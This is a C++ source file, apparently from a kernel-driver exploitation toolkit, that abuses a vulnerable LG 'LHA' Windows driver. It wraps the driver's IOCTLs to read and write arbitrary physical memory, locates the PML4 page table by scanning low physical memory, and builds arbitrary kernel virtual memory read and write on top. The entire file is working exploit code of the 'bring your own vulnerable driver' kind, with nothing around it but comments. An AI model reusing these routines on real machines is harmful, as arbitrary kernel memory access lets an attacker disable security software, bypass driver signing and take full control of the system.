/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       LHA.CPP
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  LG LHA driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/lha.h"

//
// WARNING, (BUG)FEATURE ALERT
// 
// LG crapware does not check API call results.
// This will eventually lead to BSOD in case of mapping failure.
//

/*
* LHAReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
*
*/
BOOL WINAPI LHAReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    LHA_READ_PHYSICAL_MEMORY request;

    request.Address = PhysicalAddress;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_LHA_READ_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        Buffer,
        NumberOfBytes);
}

/*
* LHAWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI LHAWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    ULONG value;
    DWORD dwError = ERROR_SUCCESS;
    LHA_WRITE_PHYSICAL_MEMORY* pRequest;

    value = FIELD_OFFSET(LHA_WRITE_PHYSICAL_MEMORY, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (LHA_WRITE_PHYSICAL_MEMORY*)VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pRequest) {

        if (VirtualLock(pRequest, size)) {

            pRequest->Address = PhysicalAddress;
            pRequest->Size = NumberOfBytes;
            RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

            bResult = supCallDriver(DeviceHandle,
                IOCTL_LHA_WRITE_PHYSICAL_MEMORY,
                pRequest,
                (ULONG)size,
                NULL,
                0);

            if (!bResult)
                dwError = GetLastError();

            VirtualUnlock(pRequest, size);
        }
        else {
            dwError = GetLastError();
        }
        VirtualFree(pRequest, 0, MEM_RELEASE);
    }

    SetLastError(dwError);
    return bResult;
}

/*
* LHAQueryPML4Value
*
* Purpose:
*
* Locate PML4.
*
*/
BOOL WINAPI LHAQueryPML4Value(
    _In_ HANDLE DeviceHandle,
    _Out_ ULONG_PTR* Value)
{
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR PML4 = 0;
    UCHAR* pbLowStub1M;
    DWORD cbRead = 0x100000;

    *Value = 0;

    do {

        pbLowStub1M = (UCHAR*)supHeapAlloc(cbRead);
        if (pbLowStub1M == NULL) {
            dwError = GetLastError();
            break;
        }

        for (ULONG_PTR i = 0; i < cbRead; i += PAGE_SIZE) {

            if (!LHAReadPhysicalMemory(DeviceHandle,
                i,
                RtlOffsetToPointer(pbLowStub1M, i),
                PAGE_SIZE))
            {
                dwError = GetLastError();
                break;
            }

        }

        if (dwError == ERROR_SUCCESS) {

            PML4 = supGetPML4FromLowStub1M((ULONG_PTR)pbLowStub1M);
            if (PML4)
                *Value = PML4;
            else
                *Value = 0;

        }

    } while (FALSE);

    if (pbLowStub1M)
        supHeapFree(pbLowStub1M);

    SetLastError(dwError);
    return (PML4 != 0);
}

/*
* LHAVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI LHAVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    return PwVirtualToPhysical(DeviceHandle,
        LHAQueryPML4Value,
        LHAReadPhysicalMemory,
        VirtualAddress,
        PhysicalAddress);
}

/*
* LHAReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI LHAReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    bResult = LHAVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = LHAReadPhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}

/*
* LHAWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI LHAWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult;
    ULONG_PTR physicalAddress = 0;

    bResult = LHAVirtualToPhysical(DeviceHandle,
        Address,
        &physicalAddress);

    if (bResult) {

        bResult = LHAWritePhysicalMemory(DeviceHandle,
            physicalAddress,
            Buffer,
            NumberOfBytes);

    }

    return bResult;
}
